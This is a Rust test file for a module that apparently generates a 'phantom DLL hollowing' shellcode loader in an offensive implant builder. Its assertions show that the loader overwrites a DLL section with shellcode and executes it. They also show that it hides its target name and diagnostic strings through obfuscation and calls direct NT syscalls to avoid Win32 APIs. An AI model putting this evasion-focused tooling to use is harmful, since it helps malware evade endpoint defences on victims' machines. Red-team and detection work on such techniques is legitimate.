//! Tests for phantom DLL hollowing.

use super::{default_module, Params, DEF, MESSAGES};
use crate::audit::strings::find_sensitive_literals_in_source;
use crate::engine::obfuscation::{StringsConfig, YamlStringsPlan};
use crate::plan::schema::PayloadFormat;
use crate::techniques::{Category, RuntimeStep, TechniqueKind};

/// The `$PLACEHOLDER$` tokens `source` still contains.
///
/// A rendered fragment must report none: `$` has no meaning in the stub outside
/// a macro, so a leftover token is always a substitution bug — including one
/// hidden in a comment, which is why this scans the raw source.
fn placeholders(source: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut rest = source;
    while let Some(start) = rest.find('$') {
        let after = &rest[start + 1..];
        let Some(end) = after.find('$') else { break };
        out.push(format!("${}$", &after[..end]));
        rest = &after[end + 1..];
    }
    out
}

/// The string configurations a plan can select: the substitution has to work for
/// both (the stack strategy emits a block, the xor strategy a call chain).
fn strategies() -> Vec<(&'static str, StringsConfig)> {
    let xor = StringsConfig::from_yaml(None).expect("default strings");
    let stack_yaml = YamlStringsPlan {
        strategy: "stack".into(),
        key: "random".into(),
    };
    let stack = StringsConfig::from_yaml(Some(&stack_yaml)).expect("stack strings");
    vec![("xor", xor), ("stack", stack)]
}

#[test]
fn parses_params_from_empty_yaml() {
    let step: TechniqueKind =
        serde_yml::from_str("technique: dll_hollowing\n").expect("dll_hollowing should parse");
    assert_eq!(
        step,
        TechniqueKind::DllHollowing {
            params: Params::default()
        }
    );
}

#[test]
fn parses_a_payload_name() {
    let step: TechniqueKind =
        serde_yml::from_str("technique: dll_hollowing\nparams:\n  payload: implant\n")
            .expect("dll_hollowing with a payload should parse");
    match step {
        TechniqueKind::DllHollowing { params } => {
            assert_eq!(params.payload.as_deref(), Some("implant"));
        }
        other => panic!("expected dll_hollowing, got {other:?}"),
    }
}

#[test]
fn parses_a_hollowing_target() {
    let step: TechniqueKind =
        serde_yml::from_str("technique: dll_hollowing\nparams:\n  module: dbghelp.dll\n")
            .expect("dll_hollowing with a module should parse");
    match step {
        TechniqueKind::DllHollowing { params } => {
            assert_eq!(params.module, "dbghelp.dll");
        }
        other => panic!("expected dll_hollowing, got {other:?}"),
    }
}

/// A step without `params:` must behave like `Params::default()`: the serde
/// default and the `Default` impl have to agree.
#[test]
fn the_omitted_module_defaults_to_the_documented_target() {
    assert_eq!(default_module(), "wininet.dll");
    assert_eq!(Params::default().module, default_module());

    let step: TechniqueKind = serde_yml::from_str("technique: dll_hollowing\nparams: {}\n")
        .expect("empty params should parse");
    match step {
        TechniqueKind::DllHollowing { params } => assert_eq!(params.module, default_module()),
        other => panic!("expected dll_hollowing, got {other:?}"),
    }
}

#[test]
fn params_round_trip_through_yaml() {
    let params = Params {
        payload: Some("implant".into()),
        module: "dbghelp.dll".into(),
    };
    let yaml = serde_yml::to_string(&params).expect("serialize params");
    let parsed: Params = serde_yml::from_str(&yaml).expect("deserialize params");
    assert_eq!(parsed, params);
}

#[test]
fn def_is_well_formed() {
    assert_eq!(DEF.name, "dll_hollowing");
    assert_eq!(DEF.category, Category::Execution);
    assert_eq!(DEF.attck, &["T1574.002"]);
    assert!(!DEF.requires.is_empty());
    assert!(!DEF.stub_fragment.is_empty());
    assert!(!DEF.readme.is_empty());
    // The kernel calls are the saved-bytes allocation plus the protection
    // changes; the payload is raw shellcode, so no import resolver is needed
    // (checked on the rendered fragment below, where the constant would not fold
    // away).
    assert_eq!(
        DEF.syscalls,
        &["NtAllocateVirtualMemory", "NtProtectVirtualMemory"]
    );
}

#[test]
fn def_exposes_the_execution_entry_point() {
    assert!(
        DEF.stub_fragment.contains("fn execute_payload"),
        "the fragment must define the Execution contract"
    );
}

#[test]
fn params_example_parses_as_a_runtime_step() {
    let step: RuntimeStep =
        serde_yml::from_str(DEF.params_example).expect("params_example should parse");
    assert_eq!(step.name(), "dll_hollowing");
}

#[test]
fn render_fragment_for_returns_the_fragment() {
    let strings = StringsConfig::from_yaml(None).expect("default strings");
    let fragment = Params::default().render_fragment_for(&strings, PayloadFormat::Pe, None);
    assert!(fragment.contains("fn execute_payload"));
}

/// Every placeholder in the fragment is either the hollowing target or one of the
/// obfuscated messages — nothing is substituted by accident.
#[test]
fn the_fragment_has_no_undocumented_placeholder() {
    let mut known: Vec<String> = MESSAGES
        .iter()
        .map(|(token, _)| token.to_string())
        .collect();
    known.push("$MODULE_DEF$".to_string());

    for token in placeholders(DEF.stub_fragment) {
        assert!(
            known.contains(&token),
            "the fragment uses {token}, which the renderer does not substitute"
        );
    }
    assert!(placeholders(DEF.stub_fragment).len() > MESSAGES.len());
}

/// The rendered fragment must be free of `$PLACEHOLDER$` tokens for every
/// obfuscation strategy, and neither the hollowing target nor the message text
/// may survive in cleartext.
#[test]
fn rendered_fragment_substitutes_placeholders_and_obfuscates_the_target() {
    let params = Params {
        payload: None,
        module: "dbghelp.dll".into(),
    };

    for (label, strings) in strategies() {
        let fragment = params.render_fragment_for(&strings, PayloadFormat::Shellcode, None);

        let leftover = placeholders(&fragment);
        assert!(
            leftover.is_empty(),
            "{label}: unsubstituted placeholders {leftover:?}"
        );
        assert!(
            !fragment.contains("dbghelp.dll"),
            "{label}: the hollowing target leaked in cleartext"
        );
        for (_, text) in MESSAGES {
            assert!(
                !fragment.contains(text),
                "{label}: the diagnostic '{text}' leaked in cleartext"
            );
        }
        // The module name is rebuilt at runtime, so the loader call takes a
        // CString built from that expression.
        assert!(fragment.contains("CString::new(module_name.as_str())"));
    }

    // The stack strategy really does rebuild the name byte by byte.
    let stack = &strategies()[1].1;
    let stack_fragment = params.render_fragment_for(stack, PayloadFormat::Shellcode, None);
    assert!(stack_fragment.contains("std::hint::black_box"));
    assert!(!stack_fragment.contains("dbghelp.dll"));
}

/// The exact contract the build flow relies on: a shellcode render leaves no
/// placeholder and no sensitive literal in the generated source.
#[test]
fn rendered_shellcode_fragment_has_no_placeholders_or_sensitive_literals() {
    let strings = StringsConfig::from_yaml(None).expect("default strings");
    let fragment = Params::default().render_fragment_for(&strings, PayloadFormat::Shellcode, None);

    assert!(
        placeholders(&fragment).is_empty(),
        "leftover placeholders in the shellcode render"
    );
    assert!(
        find_sensitive_literals_in_source(&fragment).is_empty(),
        "the rendered fragment leaks sensitive literals: {:?}",
        find_sensitive_literals_in_source(&fragment)
    );
}

/// The size-fit failure mode: the payload's length is compared against the
/// section capacity and a too-large payload fails instead of truncating.
#[test]
fn the_fragment_rejects_a_payload_larger_than_the_section() {
    let strings = StringsConfig::from_yaml(None).expect("default strings");
    let fragment = Params::default().render_fragment_for(&strings, PayloadFormat::Shellcode, None);

    assert!(
        fragment.contains("let capacity = virtual_size.max(raw_size);"),
        "the section capacity must come from the section header"
    );
    assert!(
        fragment.contains("if image.len() > section.capacity {"),
        "the payload must be checked against the section's capacity"
    );
    assert!(
        fragment.contains("return Err(with_sizes("),
        "an oversized payload must abort the load with the byte counts"
    );
    assert!(
        !fragment.contains("image.len().min(section.capacity)"),
        "the payload must never be truncated silently"
    );
}

/// The hollowing: one saved-bytes allocation, four protection changes (writable
/// then restore, twice), two memcpys (stomp and restore), and a direct call —
/// no Win32 protection or allocation call.
#[test]
fn the_fragment_hollows_through_the_syscall_layer() {
    let strings = StringsConfig::from_yaml(None).expect("default strings");
    let fragment = Params::default().render_fragment_for(&strings, PayloadFormat::Shellcode, None);

    assert_eq!(
        fragment.matches("crate::nt_alloc_vm(").count(),
        1,
        "expected one saved-bytes allocation"
    );
    assert_eq!(
        fragment.matches("crate::nt_protect_vm(").count(),
        4,
        "expected a writable and a restore protection change for both the stomp and the restore"
    );
    assert!(
        !fragment.contains("VirtualProtectEx"),
        "no direct Win32 call"
    );
    assert!(!fragment.contains("VirtualAlloc"), "no direct Win32 call");
    // Raw shellcode has no import table, so the shared resolver is not wired in
    // (`DEF.resolves_imports` is false).
    assert!(!fragment.contains("resolve_imports"));
    assert!(fragment.contains(
        "unsafe { ptr::copy_nonoverlapping(image.as_ptr(), section.start, payload_len) }"
    ));
    assert!(fragment.contains(
        "unsafe { ptr::copy_nonoverlapping(saved as *mut u8, section.start, payload_len) }"
    ));
    assert!(fragment
        .contains("let entry: PayloadEntry = unsafe { std::mem::transmute(section.start) };"));
    assert!(fragment.contains("crate::patch_command_line()?"));
}

#[test]
fn fragment_has_no_forbidden_patterns() {
    for forbidden in [
        "anyhow",
        "static mut",
        "println!",
        "eprintln!",
        "unwrap",
        "expect(",
        "panic!",
        "todo!",
        "unimplemented!",
    ] {
        assert!(
            !DEF.stub_fragment.contains(forbidden),
            "a stub fragment must not contain '{forbidden}'"
        );
    }
}
